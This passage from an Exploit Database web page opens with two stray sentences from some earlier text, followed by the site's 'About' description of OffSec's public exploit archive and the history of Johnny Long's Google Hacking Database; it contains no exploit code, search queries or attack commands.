     I still haven’t found an answer to that. I actually feel sorry for them, for wasting their lives with such stupid endeavours.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
